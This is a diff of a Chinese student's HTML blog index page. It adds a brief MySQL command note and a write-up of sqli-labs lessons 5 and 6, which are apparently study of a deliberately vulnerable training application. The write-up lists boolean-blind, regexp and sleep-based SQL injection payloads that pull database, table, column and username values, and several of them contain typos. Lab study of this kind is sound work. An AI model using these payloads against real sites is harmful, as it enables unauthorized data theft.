@@ -64,6 +64,94 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-blog f" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/11/28/blog%20f/" class="article-date">
+  <time datetime="2020-11-28T14:35:29.000Z" itemprop="datePublished">2020-11-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/11/28/blog%20f/">MySQL</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>一.基本的使用</p>
+<p>1.查看有哪些数据库：show database；</p>
+<p>2.调用security数据库：use security；</p>
+<p>3.查看被调用的数据库中有哪些表名：show tables；</p>
+<p>4.查看表的结构，如：desc  email；</p>
+<p>5.查看表的内容：select *form 表名；</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/11/28/blog%20f/" data-id="ckkrqc5c7000gn4vu53ep28le" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" rel="tag">mysql数据库的使用</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-blog e" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/11/20/blog%20e/" class="article-date">
+  <time datetime="2020-11-20T08:15:38.000Z" itemprop="datePublished">2020-11-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/11/20/blog%20e/">lesson5&amp;lesson6</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="lesson5"><a href="#lesson5" class="headerlink" title="lesson5"></a>lesson5</h1><h2 id="A-sql布尔盲注"><a href="#A-sql布尔盲注" class="headerlink" title="A.sql布尔盲注"></a>A.sql布尔盲注</h2><h4 id="一-寻找注入点"><a href="#一-寻找注入点" class="headerlink" title="一.寻找注入点"></a>一.寻找注入点</h4><p>输入?id=1返回正常；输入?id=1’返回报错；确认注入点：输入?id=0’ or 1=1–+，返回正常，说明此题‘为注入点。</p>
+<h4 id="二-爆库（遇到挫折）"><a href="#二-爆库（遇到挫折）" class="headerlink" title="二.爆库（遇到挫折）"></a>二.爆库（遇到挫折）</h4><p>通过输入之前学过的爆库语句发现得到的返回值只有you are in，无法显示出数据库名。所以要学习一种新的注入方法：盲注。</p>
+<h5 id="A-函数"><a href="#A-函数" class="headerlink" title="A.函数"></a>A.函数</h5><h6 id="left（）函数：left（a，b）即从左侧截取字符串a的前b位，例如left（database（），1），database（）显示数据库名称（为字符串），即译为截取数据库名称的第一位数。"><a href="#left（）函数：left（a，b）即从左侧截取字符串a的前b位，例如left（database（），1），database（）显示数据库名称（为字符串），即译为截取数据库名称的第一位数。" class="headerlink" title="left（）函数：left（a，b）即从左侧截取字符串a的前b位，例如left（database（），1），database（）显示数据库名称（为字符串），即译为截取数据库名称的第一位数。"></a>left（）函数：left（a，b）即从左侧截取字符串a的前b位，例如left（database（），1），database（）显示数据库名称（为字符串），即译为截取数据库名称的第一位数。</h6><h6 id="substr（）函数：substr-a-b-c-从-b-位置开始，截取字符串-a-的-c-长度，取到的值包括b位置对应字符本身。同mid（）函数。"><a href="#substr（）函数：substr-a-b-c-从-b-位置开始，截取字符串-a-的-c-长度，取到的值包括b位置对应字符本身。同mid（）函数。" class="headerlink" title="substr（）函数：substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度，取到的值包括b位置对应字符本身。同mid（）函数。"></a>substr（）函数：substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度，取到的值包括b位置对应字符本身。同mid（）函数。</h6><h6 id="ascii-函数：将某个字符转换-为-ascii-值-。同ord（）函数。"><a href="#ascii-函数：将某个字符转换-为-ascii-值-。同ord（）函数。" class="headerlink" title="ascii()函数：将某个字符转换 为 ascii 值 。同ord（）函数。"></a>ascii()函数：将某个字符转换 为 ascii 值 。同ord（）函数。</h6><h6 id="length（）函数：获取数据库长度。如-id-1’and-length-database-n–-当n的值等于数据库名称字符串长度时，返回正常，反之报错"><a href="#length（）函数：获取数据库长度。如-id-1’and-length-database-n–-当n的值等于数据库名称字符串长度时，返回正常，反之报错" class="headerlink" title="length（）函数：获取数据库长度。如?id=1’and length(database())=n–+当n的值等于数据库名称字符串长度时，返回正常，反之报错"></a>length（）函数：获取数据库长度。如?id=1’and length(database())=n–+当n的值等于数据库名称字符串长度时，返回正常，反之报错</h6><h5 id="B-猜测数据库名称"><a href="#B-猜测数据库名称" class="headerlink" title="B.猜测数据库名称"></a>B.猜测数据库名称</h5><h6 id="猜测数据库名称第一位–输入语句：-id-1‘and-left-database-1-gt-’a’–-，若返回正常，则说明数据库名称首字母大于a，反之则说明数据库首字母为a。然后使用二分法将a换成m，继续观察返回结果，重复使用二分法，直到可以确定出字母为止。"><a href="#猜测数据库名称第一位–输入语句：-id-1‘and-left-database-1-gt-’a’–-，若返回正常，则说明数据库名称首字母大于a，反之则说明数据库首字母为a。然后使用二分法将a换成m，继续观察返回结果，重复使用二分法，直到可以确定出字母为止。" class="headerlink" title="猜测数据库名称第一位–输入语句：?id=1‘and left(database(),1)&gt;’a’–+  ，若返回正常，则说明数据库名称首字母大于a，反之则说明数据库首字母为a。然后使用二分法将a换成m，继续观察返回结果，重复使用二分法，直到可以确定出字母为止。"></a>猜测数据库名称第一位–输入语句：?id=1‘and left(database(),1)&gt;’a’–+  ，若返回正常，则说明数据库名称首字母大于a，反之则说明数据库首字母为a。然后使用二分法将a换成m，继续观察返回结果，重复使用二分法，直到可以确定出字母为止。</h6><h6 id="猜测数据库名称第二位–输入语句-id-1’and-left-database-2-gt-’sa’–-若返回正常，则说明数据库名称第二位字母大于a，反之则说明数据库名称第二位字母为a。然后使用二分法将a换成m，继续观察返回结果，重复使用二分法，直到可以确定出字母为止。"><a href="#猜测数据库名称第二位–输入语句-id-1’and-left-database-2-gt-’sa’–-若返回正常，则说明数据库名称第二位字母大于a，反之则说明数据库名称第二位字母为a。然后使用二分法将a换成m，继续观察返回结果，重复使用二分法，直到可以确定出字母为止。" class="headerlink" title="猜测数据库名称第二位–输入语句?id=1’and left(database(),2)&gt;’sa’–+ ,若返回正常，则说明数据库名称第二位字母大于a，反之则说明数据库名称第二位字母为a。然后使用二分法将a换成m，继续观察返回结果，重复使用二分法，直到可以确定出字母为止。"></a>猜测数据库名称第二位–输入语句?id=1’and left(database(),2)&gt;’sa’–+ ,若返回正常，则说明数据库名称第二位字母大于a，反之则说明数据库名称第二位字母为a。然后使用二分法将a换成m，继续观察返回结果，重复使用二分法，直到可以确定出字母为止。</h6><h6 id="猜测后续字母值同上，重复使用语句即可获得数据库名称“security”。"><a href="#猜测后续字母值同上，重复使用语句即可获得数据库名称“security”。" class="headerlink" title="猜测后续字母值同上，重复使用语句即可获得数据库名称“security”。"></a>猜测后续字母值同上，重复使用语句即可获得数据库名称“security”。</h6><h4 id="三-爆表"><a href="#三-爆表" class="headerlink" title="三.爆表"></a>三.爆表</h4><h5 id="！首先要先了解一下ascii码表，用于构建注入语句。"><a href="#！首先要先了解一下ascii码表，用于构建注入语句。" class="headerlink" title="！首先要先了解一下ascii码表，用于构建注入语句。"></a>！首先要先了解一下ascii码表，用于构建注入语句。</h5><h6 id="a-爆第一个表：输入语句-id-1‘and-ascii-substr-select-table-name-from-information-schema-tables-where-table-schema-database-limit-0-1）-1，1-gt-65-–-。"><a href="#a-爆第一个表：输入语句-id-1‘and-ascii-substr-select-table-name-from-information-schema-tables-where-table-schema-database-limit-0-1）-1，1-gt-65-–-。" class="headerlink" title="a.爆第一个表：输入语句?id=1‘and ascii(substr((select table_name  from information_schema.tables where table_schema=database() limit 0,1）,1，1)) &gt;65 –+ 。"></a>a.爆第一个表：输入语句?id=1‘and ascii(substr((select table_name  from information_schema.tables where table_schema=database() limit 0,1）,1，1)) &gt;65 –+ 。</h6><h6 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h6><h6 id="1-limit-0-1的意思是从第1行开始，获取这一行的返回值。而此处的意思是获取数据库的第一个表的表名。-substr-select-table-name-from-information-schema-tables-where-table-schema-database-limit-0-1）-即获取数据库的第一个表的表名。其在substr（a，b，c）中充当a的值。"><a href="#1-limit-0-1的意思是从第1行开始，获取这一行的返回值。而此处的意思是获取数据库的第一个表的表名。-substr-select-table-name-from-information-schema-tables-where-table-schema-database-limit-0-1）-即获取数据库的第一个表的表名。其在substr（a，b，c）中充当a的值。" class="headerlink" title="1.limit 0,1的意思是从第1行开始，获取这一行的返回值。而此处的意思是获取数据库的第一个表的表名。{substr((select table_name  from information_schema.tables where table_schema=database() limit 0,1）}即获取数据库的第一个表的表名。其在substr（a，b，c）中充当a的值。"></a>1.limit 0,1的意思是从第1行开始，获取这一行的返回值。而此处的意思是获取数据库的第一个表的表名。{substr((select table_name  from information_schema.tables where table_schema=database() limit 0,1）}即获取数据库的第一个表的表名。其在substr（a，b，c）中充当a的值。</h6><h6 id="2-整个输入语句的意图是：通过ascii码转换，猜测数据库的第一个表表名的首字母。为了猜测得到表名第二位字母，仅需将substr（a-b-c-中的1改为2。后续字母以此类推，可得数据库第一个表的表名。"><a href="#2-整个输入语句的意图是：通过ascii码转换，猜测数据库的第一个表表名的首字母。为了猜测得到表名第二位字母，仅需将substr（a-b-c-中的1改为2。后续字母以此类推，可得数据库第一个表的表名。" class="headerlink" title="2.整个输入语句的意图是：通过ascii码转换，猜测数据库的第一个表表名的首字母。为了猜测得到表名第二位字母，仅需将substr（a,b,c)中的1改为2。后续字母以此类推，可得数据库第一个表的表名。"></a>2.整个输入语句的意图是：通过ascii码转换，猜测数据库的第一个表表名的首字母。为了猜测得到表名第二位字母，仅需将substr（a,b,c)中的1改为2。后续字母以此类推，可得数据库第一个表的表名。</h6><h6 id="3-猜测的过程同样采用二分法。"><a href="#3-猜测的过程同样采用二分法。" class="headerlink" title="3.猜测的过程同样采用二分法。"></a>3.猜测的过程同样采用二分法。</h6><h6 id="b-爆第二个表：仅需把a中输入语句的limit-0-1改成limit-1-1。其余照部就搬。"><a href="#b-爆第二个表：仅需把a中输入语句的limit-0-1改成limit-1-1。其余照部就搬。" class="headerlink" title="b.爆第二个表：仅需把a中输入语句的limit 0,1改成limit 1,1。其余照部就搬。"></a>b.爆第二个表：仅需把a中输入语句的limit 0,1改成limit 1,1。其余照部就搬。</h6><h4 id="四-爆列"><a href="#四-爆列" class="headerlink" title="四.爆列"></a>四.爆列</h4><h6 id="如猜测users表中是否存在username列，输入语句：-id-1’-and-1-select-1-from-information-schema-columns-where-table-name-’users’-and-column-name-regexp-‘-username’-limit-0-1-–-返回正常，则说明users表中存在username列。"><a href="#如猜测users表中是否存在username列，输入语句：-id-1’-and-1-select-1-from-information-schema-columns-where-table-name-’users’-and-column-name-regexp-‘-username’-limit-0-1-–-返回正常，则说明users表中存在username列。" class="headerlink" title="如猜测users表中是否存在username列，输入语句：?id=1’ and 1=(select 1 from       information_schema.columns where table_name=’users’ and column_name regexp ‘^username’ limit 0,1)–+返回正常，则说明users表中存在username列。"></a>如猜测users表中是否存在username列，输入语句：?id=1’ and 1=(select 1 from       information_schema.columns where table_name=’users’ and column_name regexp ‘^username’ limit 0,1)–+返回正常，则说明users表中存在username列。</h6><h6 id="证明其他列是否存在也可用上述方法，仅需变换列名。"><a href="#证明其他列是否存在也可用上述方法，仅需变换列名。" class="headerlink" title="证明其他列是否存在也可用上述方法，仅需变换列名。"></a>证明其他列是否存在也可用上述方法，仅需变换列名。</h6><h4 id="五-爆值"><a href="#五-爆值" class="headerlink" title="五.爆值"></a>五.爆值</h4><h6 id="如输入语句-id-1’-and-ord-mid-select-ifunll-cast-username-as-char-0x20-form-security-users-order-by-id-limit-0-1-1-1-68–-。意思是获取username列中第一行的第一个字符的对应ascii码的数值与68比较，以确认其值。其余操作都是按部就搬上面。"><a href="#如输入语句-id-1’-and-ord-mid-select-ifunll-cast-username-as-char-0x20-form-security-users-order-by-id-limit-0-1-1-1-68–-。意思是获取username列中第一行的第一个字符的对应ascii码的数值与68比较，以确认其值。其余操作都是按部就搬上面。" class="headerlink" title="如输入语句?id=1’ and ord mid((select  ifunll(cast(username as char),0x20)form  security.users order by id limit 0,1),1,1))=68–+ 。意思是获取username列中第一行的第一个字符的对应ascii码的数值与68比较，以确认其值。其余操作都是按部就搬上面。"></a>如输入语句?id=1’ and ord mid((select  ifunll(cast(username as char),0x20)form  security.users order by id limit 0,1),1,1))=68–+ 。意思是获取username列中第一行的第一个字符的对应ascii码的数值与68比较，以确认其值。其余操作都是按部就搬上面。</h6><h2 id="B-sql报错注入"><a href="#B-sql报错注入" class="headerlink" title="B.*sql报错注入"></a>B.*sql报错注入</h2><h2 id="C-sql延时注入"><a href="#C-sql延时注入" class="headerlink" title="C.*sql延时注入"></a>C.*sql延时注入</h2><h6 id="预备：时间盲注多与if（expr1-expr2-expr3）结合使用，此if语句的用法是：如果expr1是true，则if（）的返回值为expr2；否则返回expr3"><a href="#预备：时间盲注多与if（expr1-expr2-expr3）结合使用，此if语句的用法是：如果expr1是true，则if（）的返回值为expr2；否则返回expr3" class="headerlink" title="预备：时间盲注多与if（expr1,expr2,expr3）结合使用，此if语句的用法是：如果expr1是true，则if（）的返回值为expr2；否则返回expr3."></a><em>预备：</em>时间盲注多与if（expr1,expr2,expr3）结合使用，此if语句的用法是：如果expr1是true，则if（）的返回值为expr2；否则返回expr3.</h6><h6 id="1-利用sleep（）函数进行注入：-id-1’and-If-ascii-substr-database-1-1-115-1-sleep-5-–-当错误的时候网页会有五秒的延迟。"><a href="#1-利用sleep（）函数进行注入：-id-1’and-If-ascii-substr-database-1-1-115-1-sleep-5-–-当错误的时候网页会有五秒的延迟。" class="headerlink" title="1.利用sleep（）函数进行注入：?id=1’and If(ascii(substr(database(),1,1))=115,1,sleep(5))–+当错误的时候网页会有五秒的延迟。"></a>1.利用sleep（）函数进行注入：?id=1’and If(ascii(substr(database(),1,1))=115,1,sleep(5))–+当错误的时候网页会有五秒的延迟。</h6><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><h6 id="在本题学习时学习了sql盲注之正则表达式攻击。我们可以使用正则表达式攻击法获得表名或列名。"><a href="#在本题学习时学习了sql盲注之正则表达式攻击。我们可以使用正则表达式攻击法获得表名或列名。" class="headerlink" title="在本题学习时学习了sql盲注之正则表达式攻击。我们可以使用正则表达式攻击法获得表名或列名。"></a>在本题学习时学习了sql盲注之正则表达式攻击。我们可以使用正则表达式攻击法获得表名或列名。</h6><h6 id="1-如判断第一个表名的第一个字符是否是a-z中的字符，输入语句：-id-1’-and-1-select-1-from-information-schema-tables-where-table-name-’security’-and-table-name-regexp-‘-a-z-’-limit-0-1-–"><a href="#1-如判断第一个表名的第一个字符是否是a-z中的字符，输入语句：-id-1’-and-1-select-1-from-information-schema-tables-where-table-name-’security’-and-table-name-regexp-‘-a-z-’-limit-0-1-–" class="headerlink" title="1.如判断第一个表名的第一个字符是否是a-z中的字符，输入语句：?id=1’ and 1=(select 1 from information_schema.tables where table_name=’security’ and table_name regexp ‘^[a-z]’ limit 0,1)–+"></a>1.如判断第一个表名的第一个字符是否是a-z中的字符，输入语句：?id=1’ and 1=(select 1 from information_schema.tables where table_name=’security’ and table_name regexp ‘^[a-z]’ limit 0,1)–+</h6><h6 id="2-如判断第一个字符是否是a-n中的字符，输入语句：-id-1’-and-1-select-1-from-information-schema-tables-where-table-name-’security’-and-table-name-regexp-‘-a-n-’-limit-0-1-–"><a href="#2-如判断第一个字符是否是a-n中的字符，输入语句：-id-1’-and-1-select-1-from-information-schema-tables-where-table-name-’security’-and-table-name-regexp-‘-a-n-’-limit-0-1-–" class="headerlink" title="2.如判断第一个字符是否是a-n中的字符，输入语句：?id=1’ and 1=(select 1 from       information_schema.tables where table_name=’security’ and table_name regexp ‘^[a-n]’ limit 0,1)–+"></a>2.如判断第一个字符是否是a-n中的字符，输入语句：?id=1’ and 1=(select 1 from       information_schema.tables where table_name=’security’ and table_name regexp ‘^[a-n]’ limit 0,1)–+</h6><h6 id="3-如确定一个数是n：-id-1’-and-1-select-1-from-information-schema-tables-where-table-name-’security’-and-table-name-regexp-‘-n’-limit-0-1-–"><a href="#3-如确定一个数是n：-id-1’-and-1-select-1-from-information-schema-tables-where-table-name-’security’-and-table-name-regexp-‘-n’-limit-0-1-–" class="headerlink" title="3.如确定一个数是n：?id=1’ and 1=(select 1 from  information_schema.tables where table_name=’security’ and table_name regexp ‘^n’ limit 0,1)–+"></a>3.如确定一个数是n：?id=1’ and 1=(select 1 from  information_schema.tables where table_name=’security’ and table_name regexp ‘^n’ limit 0,1)–+</h6><h6 id="4-自己在后续的做题时发现布尔盲注法用起来很鸡肋，因为如果页面一直回显给你you-are-in那么你就无法确定注入语句是否正确。"><a href="#4-自己在后续的做题时发现布尔盲注法用起来很鸡肋，因为如果页面一直回显给你you-are-in那么你就无法确定注入语句是否正确。" class="headerlink" title="4.自己在后续的做题时发现布尔盲注法用起来很鸡肋，因为如果页面一直回显给你you are in那么你就无法确定注入语句是否正确。"></a>4.自己在后续的做题时发现布尔盲注法用起来很鸡肋，因为如果页面一直回显给你you are in那么你就无法确定注入语句是否正确。</h6><h1 id="lesson6"><a href="#lesson6" class="headerlink" title="lesson6"></a>lesson6</h1><p>由题目可知：这是双注入双引号型。我们通过查找源代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id &#x3D; &#39;&quot;&#39;.$id.&#39;&quot;&#39;;</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>易知本题的注入点仅需把lesson5的注入点 ‘ 改为 “ 即可，其余按部就班。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/11/20/blog%20e/" data-id="ckkrqc5c6000en4vu1t8vd03e" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-blog d" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/11/16/blog%20d/" class="article-date">
@@ -535,98 +623,6 @@
 
 
   
-    <article id="post-blog3" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/10/18/blog3/" class="article-date">
-  <time datetime="2020-10-18T08:15:25.000Z" itemprop="datePublished">2020-10-18</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/18/blog3/">第三章汇总</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>1.if语句：只有当表达式成立时才会执行该if后的语句，且if与跟随语句之间无”;”隔开。</p>
-<p>2.if-else语句:当存在多个if-else语句时，最近的if-else两两配对。</p>
-<p>3.swich语句:a.switch()括号内的整型表达式也可以是字符型变量的表达式。</p>
-<p>​                      b.当执行完某个语句组后遇到break，则跳出此switch结构，执行下一代码指令。</p>
-<p>4.while语句:先进行条件判断，再执行循环语句。</p>
-<p>while语句的一个小妙用，例如：(当a自减到0时即会停止循环)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int a&#x3D;3;</span><br><span class="line">while(a) a--;</span><br></pre></td></tr></table></figure>
-
-<p>5.do-while语句:先执行循环语句，在进行条件判断。当遇到单独属于do-while结构中的break时会跳出do-while语句。</p>
-<p>6.for语句:执行for(表达式1;表达式2;表达式3;)时，先执行表达式1和2，再执行循环体，最后执行表达式3。以此循环。</p>
-<p>7.else-if语句：从表达式一开始计算，当遇到表达式n成立时，跳出该if镶嵌语句。</p>
-<p>8.continue语句：结束本次循环，即不再执行continue后的代码，转入下一次循环的判断和执行。（但不会跳出该循环）</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/18/blog3/" data-id="ckkrqc5ca000nn4vu2n8206nq" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" rel="tag">C语言学习</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-blog2" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/10/04/blog2/" class="article-date">
-  <time datetime="2020-10-04T02:23:06.000Z" itemprop="datePublished">2020-10-04</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/04/blog2/">近半个月学习总结</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>第一单元<br>1.标识符： 其主要由字母，数字以及下划线组成，它的第一个字符必须是字母或下划线。<br>2.”lf”为输出double数据时的修饰符。<br>3.多输代码，熟练scanf，printf语句(基础函数)。<br>4.printf函数输出时”c”表示输出单个字符，而”s”表示输出字符串。<br>5.使用dev c++编写用对象流实现输入输出代码时，要注意头文件应表达为<iostream>，<iomanip>且在int main()之前添加”using nemespce std”。<br>6.C语言中关键字不能用作变量名。</iomanip></iostream></p>
-<p>7.scanf函数语句中不能对其进行格式化。如scanf（“%.3f”，&amp;a），这是错误格式。</p>
-<p>8.注意除数！如一个数除2和除2.0得到的答案完全不同。除以2的话会当成整型变量运算，除以2.0的话则按照实型变量计算。</p>
-<p>第二单元<br>1.”/“运算，若除数与被除数均为整数型数据，则结果也为整数型。若要保留小数，则需用以下三种格式:”1.0/1”,”1/1.0”,”1.0/1.0”。<br>2.”%”，操作数必须为整数，且运算结果答案与左侧数据符号一致。<br>3.自增自减。a.无论运算符号在整型变量的前后，运算后该整型变量的值都相同。<br>            b.运算符仅能用于整型变量，不能用于常量和表达式。<br>4.关系运算符主导的表达式的结果只有”1”,”0”两种，即计算机只判断真伪。<br>5.赋值运算符的左侧只能是变量，不能是常量和表达式。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/04/blog2/" data-id="ckkrqc5cd000sn4vu8dyt5w6j" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" rel="tag">C语言学习</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -677,7 +673,15 @@
       <ul>
         
           <li>
-            <a href="/2021/02/05/lesson29/">lesson29</a>
+            <a href="/2021/02/06/lesson38/">lesson38</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/06/lesson32-37/">lesson32-37</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/05/lesson29-31/">lesson29-31</a>
           </li>
         
           <li>
@@ -686,14 +690,6 @@
         
           <li>
             <a href="/2021/02/03/lesson24/">lesson24</a>
-          </li>
-        
-          <li>
-            <a href="/2021/02/03/lesson23/">lesson23</a>
-          </li>
-        
-          <li>
-            <a href="/2021/02/03/lesson21-22/">lesson21-22</a>
           </li>
         
       </ul>
